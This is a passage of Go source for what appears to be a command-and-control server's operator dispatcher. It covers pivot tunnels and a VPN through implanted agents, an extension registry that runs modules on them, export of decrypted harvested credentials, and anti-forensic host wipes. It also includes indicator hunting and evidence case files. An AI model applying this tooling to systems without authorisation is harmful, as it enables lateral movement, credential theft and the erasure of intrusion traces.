				continue
			}
			s.Hub.Panic(a.ID)
			panicked = append(panicked, a.ID)
		}
		return reply(upk.Map{
			"panicked": panicked,
			"count":    int64(len(panicked)),
			"skipped":  skipped,
		})

	case "events.test":
		s.Hub.Emit(hub.Event{Kind: "operator.test", Data: map[string]any{"from": op.Name}})
		return reply(upk.Map{"emitted": true})

	// ---- pivoting ----------------------------------------------------
	case "transport.set":
		// The route of an agent: the transport it speaks and the order it
		// may fall back in.  The operator knows the network of the target;
		// the beacon does not.
		agent, _ := args["agent"].(string)
		agent = strings.TrimSpace(agent)
		if agent == "" {
			return fail("transport.set: the agent is missing")
		}
		if _, ok := s.Hub.Store().Agent(agent); !ok {
			return fail("transport.set: unknown agent %q", agent)
		}
		primary, _ := args["primary"].(string)
		primary = strings.ToLower(strings.TrimSpace(primary))
		if primary == "" {
			return fail("transport.set: the primary transport is missing")
		}
		var fallback []string
		if raw, ok := args["fallback"].([]any); ok {
			for _, item := range raw {
				if name, ok := item.(string); ok && strings.TrimSpace(name) != "" {
					fallback = append(fallback, strings.ToLower(strings.TrimSpace(name)))
				}
			}
		}
		front, _ := args["front"].(string)
		inspect, _ := args["inspect"].(bool)
		httpPath, _ := args["http_path"].(string)
		wsPath, _ := args["ws_path"].(string)
		route := &store.TransportPolicy{
			Primary:  primary,
			Fallback: fallback,
			Front:    strings.TrimSpace(front),
			Inspect:  inspect,
			HTTPPath: strings.TrimSpace(httpPath),
			WSSPath:  strings.TrimSpace(wsPath),
		}
		if err := s.Hub.SetRoute(agent, route); err != nil {
			return fail("transport.set: %v", err)
		}
		return reply(upk.Map{
			"agent":     agent,
			"primary":   route.Primary,
			"fallback":  pathAny(route.Fallback),
			"front":     route.Front,
			"inspect":   route.Inspect,
			"http_path": route.HTTPPath,
			"ws_path":   route.WSSPath,
		})

	case "transport.get":
		agent, _ := args["agent"].(string)
		agent = strings.TrimSpace(agent)
		if agent == "" {
			return fail("transport.get: the agent is missing")
		}
		route, ok := s.Hub.Route(agent)
		if !ok {
			return fail("transport.get: the agent %q has no route", agent)
		}
		return reply(upk.Map{
			"agent":     agent,
			"primary":   route.Primary,
			"fallback":  pathAny(route.Fallback),
			"front":     route.Front,
			"inspect":   route.Inspect,
			"http_path": route.HTTPPath,
			"ws_path":   route.WSSPath,
		})

	case "transport.list":
		routes := s.Hub.Routes()
		out := make([]any, 0, len(routes))
		ids := make([]string, 0, len(routes))
		for id := range routes {
			ids = append(ids, id)
		}
		sort.Strings(ids)
		for _, id := range ids {
			route := routes[id]
			out = append(out, upk.Map{
				"agent":     id,
				"primary":   route.Primary,
				"fallback":  pathAny(route.Fallback),
				"front":     route.Front,
				"inspect":   route.Inspect,
				"http_path": route.HTTPPath,
				"ws_path":   route.WSSPath,
			})
		}
		return reply(upk.Map{"routes": out})

	case "pivot.list":
		tunnels := []pivot.TunnelInfo{}
		sessions := 0
		if s.Pivot != nil {
			tunnels = s.Pivot.List()
			sessions = s.Pivot.Sessions()
		}
		out := make([]any, 0, len(tunnels))
		for _, t := range tunnels {
			out = append(out, upk.Map{
				"stream":      t.Stream,
				"agent_id":    t.AgentID,
				"mode":        t.Mode,
				"listen":      t.Listen,
				"host":        t.Host,
				"port":        int64(t.Port),
				"opened":      t.Opened.Unix(),
				"streams":     int64(t.Streams),
				"bytes_up":    t.BytesUp,
				"bytes_down":  t.BytesDown,
				"state":       t.State,
				"claim":       t.Claim,
				"through":     t.Through,
				"path":        pathAny(t.Path),
				"dns":         t.DNS,
				"last_active": t.LastActivity.Unix(),
			})
		}
		// The topology is the picture of the reach: the agents, the
		// pivots between them, the clients of the proxy and the log of
		// the connections.  The dashboard draws it.
		topology := upk.Map{"nodes": []any{}, "edges": []any{},
			"clients": []any{}, "connections": []any{}, "claims": upk.Map{}}
		if s.Pivot != nil {
			topology = pivotTopology(s.Pivot.Topology())
		}
		return reply(upk.Map{
			"tunnels":  out,
			"sessions": int64(sessions),
			"topology": topology,
		})

	case "pivot.open":
		if s.Pivot == nil {
			return fail("pivot.open: pivoting is not enabled on this server")
		}
		id, _ := args["id"].(string)
		if _, ok := s.Hub.Store().Agent(id); !ok {
			return fail("pivot.open: unknown agent %q", id)
		}
		mode, _ := args["mode"].(string)
		host, _ := args["host"].(string)
		listen, _ := args["listen"].(string)
		port, _ := asInt64(args["port"])
		dns, _ := args["dns"].(string)
		claim, _ := args["claim"].(string)
		through, _ := args["through"].(string)
		user, _ := args["user"].(string)
		password, _ := args["password"].(string)
		loopback, _ := args["loopback"].(bool)
		pipe, _ := args["pipe"].(bool)
		pipeName, _ := args["pipe_name"].(string)
		// The chain of hops after the first agent: the server walks it,
		// so the operator only names the far end.
		var path []string
		if raw, ok := args["path"].([]any); ok {
			for _, hop := range raw {
				if name, ok := hop.(string); ok && name != "" {
					path = append(path, name)
				}
			}
		}
		tun, err := s.Pivot.Open(id, pivot.Options{
			Mode:     mode,
			Host:     host,
			Port:     int(port),
			Listen:   listen,
			DNS:      dns,
			Loopback: loopback,
			Claim:    claim,
			Through:  through,
			User:     user,
			Password: password,
			Path:     path,
			Pipe:     pipe,
			PipeName: pipeName,
		})
		if err != nil {
			return fail("pivot.open: %v", err)
		}
		return reply(upk.Map{
			"stream":   tun.Stream,
			"agent_id": tun.AgentID,
			"mode":     tun.Mode,
			"listen":   tun.Listen,
			"host":     tun.Host,
			"port":     int64(tun.Port),
			"claim":    tun.Claim,
			"through":  tun.Through,
			"dns":      tun.DNS,
			"path":     pathAny(tun.Path),
			"pipe":     tun.Pipe,
		})

	case "pivot.close":
		if s.Pivot == nil {
			return fail("pivot.close: pivoting is not enabled on this server")
		}
		stream, _ := args["stream"].(string)
		if err := s.Pivot.Close(stream); err != nil {
			return fail("pivot.close: %v", err)
		}
		return reply(upk.Map{"stream": stream, "closed": true})

	case "pivot.claim":
		// The claims of the engagement: the name and the pivots it holds.
		if s.Pivot == nil {
			return fail("pivot.claim: pivoting is not enabled on this server")
		}
		claims := s.Pivot.Claims()
		names := make([]string, 0, len(claims))
		for name := range claims {
			names = append(names, name)
		}
		sort.Strings(names)
		out := make([]any, 0, len(names))
		for _, name := range names {
			out = append(out, upk.Map{"claim": name, "tunnels": claims[name]})
		}
		return reply(upk.Map{"claims": out, "count": int64(len(out))})

	case "pivot.release":
		// The end of a claim: every pivot of it is torn down.
		if s.Pivot == nil {
			return fail("pivot.release: pivoting is not enabled on this server")
		}
		claim, _ := args["claim"].(string)
		closed, err := s.Pivot.Release(claim)
		if err != nil {
			return fail("pivot.release: %v", err)
		}
		return reply(upk.Map{"claim": claim, "closed": closed, "count": int64(len(closed))})

	// ---- layer-3 tunnel ----------------------------------------------
	case "vpn.status":
		if s.VPN == nil {
			return reply(upk.Map{"enabled": false})
		}
		status := s.VPN.Status()
		status["enabled"] = true
		return reply(toUpkMap(status))

	case "vpn.peers":
		if s.VPN == nil {
			return reply(upk.Map{"peers": []any{}})
		}
		peers := s.VPN.Peers()
		out := make([]any, 0, len(peers))
		for _, p := range peers {
			out = append(out, upk.Map{
				"id":        p.ID,
				"address":   p.Address,
				"endpoint":  p.Endpoint,
				"agent":     p.Agent,
				"live":      p.Live,
				"bytes_in":  p.BytesIn,
				"bytes_out": p.BytesOut,
				"last_seen": p.LastSeen,
			})
		}
		return reply(upk.Map{"peers": out, "count": int64(len(out))})

	case "vpn.allocate":
		if s.VPN == nil {
			return fail("vpn.allocate: the tunnel is not enabled on this server")
		}
		id, _ := args["id"].(string)
		if id == "" {
			return fail("vpn.allocate needs an agent id")
		}
		if _, ok := s.Hub.Store().Agent(id); !ok {
			return fail("vpn.allocate: unknown agent %q", id)
		}
		ip, err := s.VPN.Allocate(id)
		if err != nil {
			return fail("vpn.allocate: %v", err)
		}
		return reply(upk.Map{"id": id, "address": ip.String()})

	case "vpn.routes":
		if s.VPN == nil {
			return reply(upk.Map{"routes": []any{}})
		}
		routes := s.VPN.Routes()
		out := make([]any, 0, len(routes))
		for _, r := range routes {
			out = append(out, upk.Map{
				"peer":    r.Peer,
				"network": r.Network,
				"bytes":   r.Bytes,
				"packets": r.Packets,
			})
		}
		return reply(upk.Map{"routes": out, "count": int64(len(out))})

	case "vpn.route":
		if s.VPN == nil {
			return fail("vpn.route: the tunnel is not enabled on this server")
		}
		peer, _ := args["peer"].(string)
		network, _ := args["network"].(string)
		if peer == "" || network == "" {
			return fail("vpn.route needs a peer and a network")
		}
		if remove, _ := args["remove"].(bool); remove {
			if !s.VPN.RemoveRoute(network) {
				return fail("vpn.route: no route for %q", network)
			}
			return reply(upk.Map{"removed": true, "network": network})
		}
		route, err := s.VPN.SetRoute(peer, network)
		if err != nil {
			return fail("vpn.route: %v", err)
		}
		return reply(upk.Map{
			"peer":    route.Peer,
			"network": route.Network,
			"bytes":   route.Bytes,
			"packets": route.Packets,
		})

	case "vpn.ping":
		if s.VPN == nil {
			return fail("vpn.ping: the tunnel is not enabled on this server")
		}
		peer, _ := args["peer"].(string)
		if peer == "" {
			return fail("vpn.ping needs a peer")
		}
		timeout := 5 * time.Second
		if ms, ok := asInt64(args["timeout_ms"]); ok && ms > 0 {
			timeout = time.Duration(ms) * time.Millisecond
		}
		rtt, err := s.VPN.Ping(peer, timeout)
		if err != nil {
			return fail("vpn.ping: %v", err)
		}
		return reply(upk.Map{
			"peer":     peer,
			"rtt_ms":   rtt.Milliseconds(),
			"rtt_text": rtt.String(),
		})

	// ---- extensions ---------------------------------------------------
	case "armory.list":
		if s.Armory == nil {
			return reply(upk.Map{"entries": []any{}, "installed": []any{}})
		}
		cat := s.Armory.Catalog()
		entries := make([]any, 0, len(cat.Entries))
		for _, m := range cat.Entries {
			entries = append(entries, manifestMap(m))
		}
		installed := s.Armory.List()
		rows := make([]any, 0, len(installed))
		for _, ext := range installed {
			rows = append(rows, upk.Map{
				"name":      ext.Manifest.Name,
				"version":   ext.Manifest.Version,
				"sha256":    ext.Manifest.SHA256,
				"size":      ext.Bytes,
				"installed": ext.Installed.Unix(),
				"caps":      stringsToAny(ext.Manifest.Caps),
				"format":    ext.Manifest.Format,
			})
		}
		return reply(upk.Map{
			"entries":   entries,
			"installed": rows,
			"verified":  s.Armory.Verified(),
		})

	case "armory.search":
		if s.Armory == nil {
			return reply(upk.Map{"entries": []any{}, "count": 0})
		}
		query, _ := args["query"].(string)
		found := s.Armory.Search(query)
		entries := make([]any, 0, len(found))
		for _, m := range found {
			entries = append(entries, manifestMap(m))
		}
		return reply(upk.Map{
			"entries": entries,
			"count":   len(entries),
			"query":   query,
		})

	case "armory.needs":
		if s.Armory == nil {
			return fail("armory.needs: the extension registry is not enabled")
		}
		name, _ := args["name"].(string)
		if name == "" {
			return fail("armory.needs needs a name")
		}
		needs, err := s.Armory.Needs(name)
		if err != nil {
			return fail("armory.needs: %v", err)
		}
		return reply(upk.Map{
			"name":     needs.Name,
			"version":  needs.Version,
			"format":   needs.Format,
			"os":       needs.OS,
			"arch":     needs.Arch,
			"digest":   needs.Digest,
			"caps":     stringsToAny(needs.Caps),
			"args":     argSchemaToAny(needs.Args),
			"output":   outputMap(needs.Output),
			"requires": stringsToAny(needs.Requires),
			"missing":  stringsToAny(needs.Missing),
		})

	case "armory.versions":
		if s.Armory == nil {
			return reply(upk.Map{"name": "", "versions": []any{}})
		}
		name, _ := args["name"].(string)
		if name == "" {
			return fail("armory.versions needs a name")
		}
		versions := s.Armory.Versions(name)
		return reply(upk.Map{
			"name":     name,
			"versions": stringsToAny(versions),
			"count":    len(versions),
		})

	case "armory.resolve":
		if s.Armory == nil {
			return fail("armory.resolve: the extension registry is not enabled")
		}
		name, _ := args["name"].(string)
		if name == "" {
			return fail("armory.resolve needs a name")
		}
		order, err := s.Armory.Resolve(name)
		if err != nil {
			return fail("armory.resolve: %v", err)
		}
		names := make([]any, 0, len(order))
		for _, m := range order {
			names = append(names, m.Name)
		}
		return reply(upk.Map{
			"name":     name,
			"order":    names,
			"count":    len(names),
			"modules":  entriesOf(order),
			"resolved": true,
		})

	case "armory.import":
		if s.Armory == nil {
			return fail("armory.import: the extension registry is not enabled")
		}
		url, _ := args["url"].(string)
		if url == "" {
			return fail("armory.import needs an url")
		}
		cat, err := s.Armory.ImportCatalog(context.Background(), url)
		if err != nil {
			return fail("armory.import: %v", err)
		}
		return reply(upk.Map{
			"source":   cat.Source,
			"entries":  len(cat.Entries),
			"url":      url,
			"verified": cat.Verified,
		})

	case "armory.install":
		if s.Armory == nil {
			return fail("armory.install: the extension registry is not enabled")
		}
		name, _ := args["name"].(string)
		if name == "" {
			return fail("armory.install needs a name")
		}
		ext, err := s.Armory.InstallVersion(name, "")
		if err != nil {
			return fail("armory.install: %v", err)
		}
		return reply(upk.Map{
			"name":      ext.Manifest.Name,
			"version":   ext.Manifest.Version,
			"sha256":    ext.Manifest.SHA256,
			"size":      ext.Bytes,
			"installed": ext.Installed.Unix(),
		})

	case "armory.remove":
		if s.Armory == nil {
			return fail("armory.remove: the extension registry is not enabled")
		}
		name, _ := args["name"].(string)
		if err := s.Armory.Remove(name); err != nil {
			return fail("armory.remove: %v", err)
		}
		return reply(upk.Map{"name": name, "removed": true})

	case "armory.run":
		name, _ := args["name"].(string)
		agentID, _ := args["id"].(string)
		taskArgs, _ := args["args"].(map[string]any)
		t, err := s.submitExtension(agentID, name, taskArgs)
		if err != nil {
			return fail("armory.run: %v", err)
		}
		return reply(upk.Map{"task_id": t.ID, "agent_id": t.AgentID, "name": name})

	// ---- runtime command namespace -----------------------------------
	case "alias.list":
		aliases := []alias.Alias{}
		if s.Aliases != nil {
			aliases = s.Aliases.List()
		}
		out := make([]any, 0, len(aliases))
		for _, a := range aliases {
			out = append(out, upk.Map{
				"name":        a.Name,
				"kind":        a.Kind,
				"extension":   a.Extension,
				"args":        toUpkMap(a.Args),
				"args_spec":   stringsToAny(a.ArgsSpec),
				"description": a.Description,
				"by":          a.CreatedBy,
				"created":     a.Created.Unix(),
			})
		}
		return reply(upk.Map{"aliases": out, "count": int64(len(out))})

	case "alias.run":
		if s.Aliases == nil {
			return fail("alias.run: the command namespace is not enabled")
		}
		name, _ := args["name"].(string)
		agentID, _ := args["id"].(string)
		extra, _ := args["args"].(map[string]any)
		kind, merged, extension, err := s.Aliases.Expand(name, extra)
		if err != nil {
			return fail("alias.run: %v", err)
		}
		if extension != "" {
			t, err := s.submitExtension(agentID, extension, merged)
			if err != nil {
				return fail("alias.run: %v", err)
			}
			return reply(upk.Map{"task_id": t.ID, "agent_id": t.AgentID, "name": name})
		}
		if err := forensicGuard(role, kind); err != nil {
			return fail("alias.run: %v", err)
		}
		if err := s.approvalGuard(kind); err != nil {
			return fail("alias.run: %v", err)
		}
		t, err := s.Hub.SubmitTask(agentID, kind, merged)
		if err != nil {
			return fail("alias.run: %v", err)
		}
		return reply(upk.Map{"task_id": t.ID, "agent_id": t.AgentID, "name": name, "kind": kind})

	case "alias.add":
		// The command namespace is shared: the team writes the aliases
		// everybody uses, and everybody sees who wrote them.
		if s.Aliases == nil {
			return fail("alias.add: the command namespace is not enabled")
		}
		name, _ := args["name"].(string)
		name = strings.TrimSpace(name)
		if name == "" {
			return fail("alias.add needs a name")
		}
		kind, _ := args["kind"].(string)
		extension, _ := args["extension"].(string)
		if kind == "" && extension == "" {
			return fail("alias.add needs a kind or an extension")
		}
		aliasArgs, _ := args["args"].(map[string]any)
		if aliasArgs == nil {
			aliasArgs = map[string]any{}
		}
		description, _ := args["description"].(string)
		spec := []string{}
		if raw, ok := args["args_spec"].([]any); ok {
			for _, item := range raw {
				if name, ok := item.(string); ok {
					spec = append(spec, name)
				}
			}
		}
		if err := s.Aliases.Register(alias.Alias{
			Name:        name,
			Kind:        kind,
			Extension:   extension,
			Args:        aliasArgs,
			ArgsSpec:    spec,
			Description: description,
			CreatedBy:   op.Name,
		}); err != nil {
			return fail("alias.add: %v", err)
		}
		// The namespace is shared: it has to survive the restart, or the
		// template one operator wrote is gone for the next one.
		if err := s.Aliases.Save(); err != nil {
			return fail("alias.add: %v", err)
		}
		s.Hub.Emit(hub.Event{Kind: "alias.created", From: op.Name,
			Data: map[string]any{"name": name, "kind": kind}})
		return reply(upk.Map{"name": name, "kind": kind, "by": op.Name, "created": true})

	case "alias.remove":
		if s.Aliases == nil {
			return fail("alias.remove: the command namespace is not enabled")
		}
		name, _ := args["name"].(string)
		if name == "" {
			return fail("alias.remove needs a name")
		}
		if err := s.Aliases.Remove(name); err != nil {
			return fail("alias.remove: %v", err)
		}
		if err := s.Aliases.Save(); err != nil {
			return fail("alias.remove: %v", err)
		}
		s.Hub.Emit(hub.Event{Kind: "alias.removed", From: op.Name,
			Data: map[string]any{"name": name}})
		return reply(upk.Map{"name": name, "removed": true})

	case "creds.list":
		// The vault of the engagement.  The values are not in here: the
		// operator sees the shape of the material and asks for the value
		// with creds.export.
		agent, _ := args["agent"].(string)
		kind, _ := args["kind"].(string)
		query, _ := args["query"].(string)
		limit, _ := asInt64(args["limit"])
		records := s.Hub.Store().Credentials(agent, kind, query, int(limit))
		out := make([]any, 0, len(records))
		for _, record := range records {
			out = append(out, toUpkMap(credentialMap(&record)))
		}
		return reply(upk.Map{
			"credentials": out,
			"count":       len(out),
			"encrypted":   s.Hub.VaultEncrypted(),
		})

	case "creds.search":
		query, _ := args["query"].(string)
		if strings.TrimSpace(query) == "" {
			return fail("creds.search needs a query")
		}
		kind, _ := args["kind"].(string)
		agent, _ := args["agent"].(string)
		limit, _ := asInt64(args["limit"])
		records := s.Hub.Store().Credentials(agent, kind, query, int(limit))
		out := make([]any, 0, len(records))
		for _, record := range records {
			out = append(out, toUpkMap(credentialMap(&record)))
		}
		return reply(upk.Map{
			"credentials": out,
			"count":       len(out),
			"query":       query,
			"encrypted":   s.Hub.VaultEncrypted(),
		})

	case "creds.export":
		// The value of the material.  It comes out of the vault, so the
		// server has to be able to open it: without a key the export says
		// so instead of returning nothing.
		if !s.Hub.VaultEncrypted() {
			return fail("the vault has no key: configure vault_key before exporting")
		}
		agent, _ := args["agent"].(string)
		kind, _ := args["kind"].(string)
		query, _ := args["query"].(string)
		limit, _ := asInt64(args["limit"])
		records := s.Hub.Store().Credentials(agent, kind, query, int(limit))
		out := make([]any, 0, len(records))
		failed := 0
		for _, record := range records {
			fields := credentialMap(&record)
			if record.Secret == "" {
				failed++
				continue
			}
			secret, err := s.Hub.VaultOpen(record.Secret)
			if err != nil {
				failed++
				continue
			}
			fields["secret"] = secret
			out = append(out, toUpkMap(fields))
		}
		return reply(upk.Map{
			"credentials": out,
			"count":       len(out),
			"failed":      failed,
		})

	case "engagement.wipe":
		// The end of an engagement: the record of the machines that were
		// touched stops existing on the server.  The implants are not
		// touched: they are still out there.
		agents, tasks, schedules := s.Hub.WipeEngagement()
		return reply(upk.Map{
			"agents":    int64(agents),
			"tasks":     int64(tasks),
			"schedules": int64(schedules),
		})

	case "forensics.survey", "forensics.verify", "forensics.report", "forensics.timeline",
		"forensics.wipe", "forensics.self", "forensics.decommission", "forensics.deadman":
		// The zero-footprint wipe of a host.
		//
		// The command does not touch the host itself: it queues the task
		// that does, and the answer of the implant carries what was
		// removed and what the platform refused to let it remove.  A
		// report that says "the host is clean" without saying which of
		// the two happened is not a report.
		//
		// The command names one host or a group of them: the end of an
		// engagement touches every machine of it, and the operator
		// should not have to type the name of each one.  A group is
		// named with `agents` or with a filter (`state`, `os`, `tag`,
		// ...); a command with neither is refused rather than guessed.
		kind := forensicTaskKind(cmd)
		if err := s.approvalGuard(kind); err != nil {
			return fail("%s: %v", cmd, err)
		}
		taskArgs := map[string]any{}
		if what, ok := args["what"]; ok {
			taskArgs["what"] = what
		}
		if dry, ok := args["dry_run"].(bool); ok {
			taskArgs["dry_run"] = dry
		}
		if journal, ok := args["journal"].(string); ok {
			taskArgs["journal"] = journal
		}
		if minutes, ok := asInt64(args["minutes"]); ok {
			taskArgs["minutes"] = minutes
		}
		id, _ := args["id"].(string)
		if id != "" {
			t, err := s.Hub.SubmitTask(id, kind, taskArgs)
			if err != nil {
				return fail("%s: %v", cmd, err)
			}
			return reply(upk.Map{
				"task_id":  t.ID,
				"agent_id": t.AgentID,
				"kind":     kind,
			})
		}
		var targets []*store.Agent
		if all, _ := args["all"].(bool); all {
			targets = s.Hub.SelectAgents(hub.AgentFilter{})
		} else {
			selected, err := s.selectTargets(args)
			if err != nil {
				return fail("%s: %v", cmd, err)
			}
			targets = selected
		}
		if len(targets) == 0 {
			return fail("%s: no agents matched", cmd)
		}
		rows := make([]any, 0, len(targets))
		for _, a := range targets {
			t, err := s.Hub.SubmitTask(a.ID, kind, taskArgs)
			if err != nil {
				rows = append(rows, upk.Map{"agent_id": a.ID, "error": err.Error()})
				continue
			}
			rows = append(rows, upk.Map{
				"agent_id": a.ID, "task_id": t.ID, "state": t.State,
			})
		}
		return reply(upk.Map{
			"tasks": rows, "count": int64(len(rows)), "kind": kind,
		})

	// ---- the hunt: the indicators of the team --------------------------
	case "hunt.add":
		// An indicator goes into the catalogue of the team.  The
		// catalogue is shared, so the value is checked against the
		// ones that are already there: the same loader added twice
		// would make the hunt report it twice.
		if s.Hunt == nil {
			return fail("hunt.add: this server has no indicator catalogue")
		}
		value, _ := args["value"].(string)
		kind, _ := args["kind"].(string)
		label, _ := args["label"].(string)
		note, _ := args["note"].(string)
		source, _ := args["source"].(string)
		ind, err := s.Hunt.Add(hunt.Indicator{
			Kind:   kind,
			Value:  value,
			Label:  label,
			Note:   note,
			Source: source,
		})
		if err != nil {
			return fail("hunt.add: %v", err)
		}
		if err := s.Hunt.Save(); err != nil {
			s.Log.Warn("the indicator catalogue could not be saved", "err", err)
		}
		return reply(upk.Map{
			"id": ind.ID, "kind": ind.Kind, "value": ind.Value,
			"label": ind.Label, "note": ind.Note, "source": ind.Source,
			"added": ind.Added.Format(time.RFC3339),
		})

	case "hunt.list":
		// The catalogue of the team, or the part of it the operator
		// is looking for.  The search is over the value, the label,
		// the note and the source: the operator remembers the ticket
		// and not the hash.
		if s.Hunt == nil {
			return fail("hunt.list: this server has no indicator catalogue")
		}
		query, _ := args["query"].(string)
		kind, _ := args["kind"].(string)
		items := s.Hunt.Search(query, kind)
		rows := make([]any, 0, len(items))
		for _, ind := range items {
			rows = append(rows, upk.Map{
				"id": ind.ID, "kind": ind.Kind, "value": ind.Value,
				"label": ind.Label, "note": ind.Note, "source": ind.Source,
				"hits": int64(ind.Hits),
				"added": ind.Added.Format(time.RFC3339),
			})
		}
		return reply(upk.Map{
			"indicators": rows, "count": int64(len(rows)),
			"total": int64(len(s.Hunt.List())),
		})

	case "hunt.remove":
		// An indicator leaves the catalogue.  The hunts that are
		// already running carry their own copy, so nothing that is in
		// flight changes.
		if s.Hunt == nil {
			return fail("hunt.remove: this server has no indicator catalogue")
		}
		id, _ := args["id"].(string)
		if err := s.Hunt.Remove(id); err != nil {
			return fail("hunt.remove: %v", err)
		}
		if err := s.Hunt.Save(); err != nil {
			s.Log.Warn("the indicator catalogue could not be saved", "err", err)
		}
		return reply(upk.Map{"id": id, "removed": true})

	case "hunt.sweep":
		// The hunt itself: the catalogue goes to one host, or to
		// every host a filter selects.  The implant is told what to
		// look for and not what else the team knows.
		if s.Hunt == nil {
			return fail("hunt.sweep: this server has no indicator catalogue")
		}
		items := s.Hunt.List()
		// The operator may narrow the catalogue for one sweep, or hunt
		// for something that is not in it yet.  The indicators of the
		// moment are not written into the catalogue: the catalogue is
		// what the team shares, and a one-off sweep is not a decision
		// of the team.
		if raw, ok := args["indicators"].([]any); ok && len(raw) > 0 {
			items = nil
			for _, entry := range raw {
				m, ok := entry.(map[string]any)
				if !ok {
					continue
				}
				kind, _ := m["kind"].(string)
				value, _ := m["value"].(string)
				label, _ := m["label"].(string)
				id, _ := m["id"].(string)
				if strings.TrimSpace(value) == "" {
					continue
				}
				items = append(items, hunt.Indicator{
					ID: id, Kind: kind, Value: value, Label: label,
				})
			}
		}
		if len(items) == 0 {
			return fail("hunt.sweep: the catalogue is empty")
		}
		payload := hunt.Indicators{Items: items}
		if roots := stringList(args["roots"]); len(roots) > 0 {
			payload.Roots = roots
		}
		taskArgs := map[string]any{
			"indicators": huntIndicatorPayload(payload),
		}
		if len(payload.Roots) > 0 {
			taskArgs["roots"] = anyList(payload.Roots)
		}
		id, _ := args["id"].(string)
		if id != "" {
			t, err := s.Hub.SubmitTask(id, "hunt.scan", taskArgs)
			if err != nil {
				return fail("hunt.sweep: %v", err)
			}
			return reply(upk.Map{
				"task_id": t.ID, "agent_id": t.AgentID,
				"kind": "hunt.scan", "indicators": int64(len(items)),
			})
		}
		var targets []*store.Agent
		if all, _ := args["all"].(bool); all {
			targets = s.Hub.SelectAgents(hub.AgentFilter{})
		} else {
			selected, err := s.selectTargets(args)
			if err != nil {
				return fail("hunt.sweep: %v", err)
			}
			targets = selected
		}
		if len(targets) == 0 {
			return fail("hunt.sweep: no agents matched")
		}
		rows := make([]any, 0, len(targets))
		for _, a := range targets {
			t, err := s.Hub.SubmitTask(a.ID, "hunt.scan", taskArgs)
			if err != nil {
				rows = append(rows, upk.Map{"agent_id": a.ID, "error": err.Error()})
				continue
			}
			rows = append(rows, upk.Map{
				"agent_id": a.ID, "task_id": t.ID, "state": t.State,
			})
		}
		return reply(upk.Map{
			"tasks": rows, "count": int64(len(rows)), "kind": "hunt.scan",
			"indicators": int64(len(items)),
		})

	// ---- the health of the fleet ---------------------------------------
	case "health.fleet":
		// The score of every host, worst first.  The parts of the
		// score travel with it: a number an operator cannot explain is
		// a number nobody acts on.
		fleet := s.HealthFleet()
		reports := make([]any, 0, len(fleet.Reports))
		for _, r := range fleet.Reports {
			parts := make([]any, 0, len(r.Parts))
			for _, p := range r.Parts {
				parts = append(parts, upk.Map{
					"name": p.Name, "weight": int64(p.Weight),
					"value": int64(p.Value), "note": p.Note,
				})
			}
			notes := make([]any, 0, len(r.Notes))
			for _, n := range r.Notes {
				notes = append(notes, n)
			}
			reports = append(reports, upk.Map{
				"agent_id": r.AgentID,
				"score":    int64(r.Score),
				"grade":    r.Grade,
				"parts":    parts,
				"notes":    notes,
				"interval": int64(r.Interval),
				"last_seen": r.LastSeen.Format(time.RFC3339),
			})
		}
		counts := upk.Map{}
		for grade, n := range fleet.Counts {
			counts[grade] = int64(n)
		}
		return reply(upk.Map{
			"reports": reports, "count": int64(len(reports)),
			"average": int64(fleet.Average), "counts": counts,
			"at": fleet.At.Format(time.RFC3339),
		})

	// ---- the evidence files --------------------------------------------
	case "case.create":
		// A case is opened by somebody, at a time: the chain of
		// custody starts with that and cannot be written afterwards.
		if s.Cases == nil {
			return fail("case.create: this server has no case registry")
		}
		title, _ := args["title"].(string)
		notes, _ := args["notes"].(string)
		c, err := s.Cases.Open(title, notes, op.Name)
		if err != nil {
			return fail("case.create: %v", err)
		}
		if err := s.Cases.Save(); err != nil {
			s.Log.Warn("the case registry could not be saved", "err", err)
		}
		return reply(upk.Map{
			"id": c.ID, "title": c.Title, "state": c.State,
			"operator": c.Operator,
			"opened":   c.Opened.Format(time.RFC3339),
			"head":     c.Head,
		})

	case "case.list":
		if s.Cases == nil {
			return fail("case.list: this server has no case registry")
		}
		cases := s.Cases.List()
		rows := make([]any, 0, len(cases))
		for _, c := range cases {
			ok, _, _ := casefile.Verify(c)
			rows = append(rows, upk.Map{
				"id": c.ID, "title": c.Title, "state": c.State,
				"operator": c.Operator,
				"opened":   c.Opened.Format(time.RFC3339),
				"closed":   c.Closed.Format(time.RFC3339),
				"artefacts": int64(len(c.Artefacts)),
				"events":    int64(len(c.Events)),
				"head":      c.Head,
				"intact":    ok,
			})
		}
		return reply(upk.Map{"cases": rows, "count": int64(len(rows))})

	case "case.get":
		// One case with its chain of custody.  The verification is part
		// of the answer: a chain that does not fit is shown as broken,
		// and the event where it breaks is named.
		if s.Cases == nil {
			return fail("case.get: this server has no case registry")
		}
		id, _ := args["id"].(string)
		c, found := s.Cases.Get(id)
		if !found {
			return fail("case.get: no such case %q", id)
		}
		artefacts := make([]any, 0, len(c.Artefacts))
		for _, a := range c.Artefacts {
			artefacts = append(artefacts, upk.Map{
				"id": a.ID, "kind": a.Kind, "ref": a.Ref, "sha256": a.Hash,
				"size": a.Size, "agent_id": a.AgentID, "task_id": a.TaskID,
				"taken": a.Taken.Format(time.RFC3339), "taken_by": a.TakenBy,
				"note": a.Note,
			})
		}
		events := make([]any, 0, len(c.Events))
		for _, e := range c.Events {
			events = append(events, upk.Map{
				"seq": int64(e.Seq), "at": e.At.Format(time.RFC3339),
				"actor": e.Actor, "action": e.Action, "artefact": e.Artefact,
				"note": e.Note, "prev": e.Prev, "hash": e.Hash,
			})
		}
		intact, brokenAt, reason := casefile.Verify(c)
		return reply(upk.Map{
			"id": c.ID, "title": c.Title, "notes": c.Notes,
			"state": c.State, "operator": c.Operator,
			"opened": c.Opened.Format(time.RFC3339),
			"closed": c.Closed.Format(time.RFC3339),
			"artefacts": artefacts, "events": events, "head": c.Head,
			"intact": intact, "broken_at": int64(brokenAt), "reason": reason,
		})

	case "case.add":
		// A piece of evidence enters the case.  The hash travels with
		// it: it is what proves that the bytes did not change since
		// they were taken.
		if s.Cases == nil {
			return fail("case.add: this server has no case registry")
		}
		id, _ := args["id"].(string)
		kind, _ := args["kind"].(string)
		ref, _ := args["ref"].(string)
		hash, _ := args["sha256"].(string)
		agentID, _ := args["agent_id"].(string)
		taskID, _ := args["task_id"].(string)
		note, _ := args["note"].(string)
		size, _ := asInt64(args["size"])
		art, err := s.Cases.Add(id, kind, ref, hash, agentID, taskID, op.Name, note, size)
		if err != nil {
			return fail("case.add: %v", err)
		}
		if err := s.Cases.Save(); err != nil {
			s.Log.Warn("the case registry could not be saved", "err", err)
		}
		return reply(upk.Map{
